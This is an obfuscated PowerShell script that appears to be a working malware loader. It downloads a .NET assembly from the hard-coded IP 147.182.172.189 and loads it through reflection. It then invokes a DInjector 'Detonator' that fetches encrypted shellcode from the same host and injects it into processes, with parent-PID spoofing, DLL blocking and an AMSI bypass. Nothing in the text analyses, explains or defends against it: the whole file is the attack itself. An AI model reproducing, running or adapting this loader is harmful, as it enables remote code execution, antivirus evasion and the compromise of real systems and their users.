  sV  ('YuE51') ([typE]('SySTeM.REFLEcTIOn.aSSemblY'));  
${a} = 'currentthread'
${B} = '147.182.172.189'
${C} = 80
${D} = "user32.dll"
${E} =  '9tVI0'
${f} = 'z64&Rx27Z$B%73up'
${g} = 'C:\Windows\System32\svchost.exe'
${h} = 'notepad'
${I} = 'explorer'
${j} = 'msvcp_win.dll'
${k} = 'True'
${l} = 'True'

${MeThODS} = @('remotethread','remotethreaddll','remotethreadview','remotethreadsuspended')
if (${mEthOdS}.('Contains').Invoke('currentthread')) {
    ${h} = &( Start-Process -WindowStyle Hidden -PassThru notepad).id
}

${METhODS} = @('remotethreadapc','remotethreadcontext','processhollow')
if (${mEthODS}.('Contains').Invoke('currentthread')) {
    try {
        ${I} = &(Get-Process explorer -ErrorAction Stop).id
    }
    catch {
        ${I} = 0
    }
}

${c`MD} = 'currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:notepad /ppid:explorer /dll:msvcp_win.dll /blockDlls:True /am51:True'

${dAtA} = (IWR -UseBasicParsing 'http://147.182.172.189:80/user32.dll').ContEnT
${AssEM} =  ( ls ('vaRIaBLe:yUE51')  )."VaLUe"::('Load').Invoke(${dAtA})

${fLAGS} = [Reflection.BindingFlags] ('NonPublic,Static')

${clASs} = ${asSEm}.('GetType').Invoke(('DInjector.Detonator'), ${flAgS})
${En`TRY} = ${ClASS}.('GetMethod').Invoke(('boom'), ${fLAGS})

${EntRY}."INVokE"(${nULL}, (, ${cmd}.('Split').Invoke(" ")))

    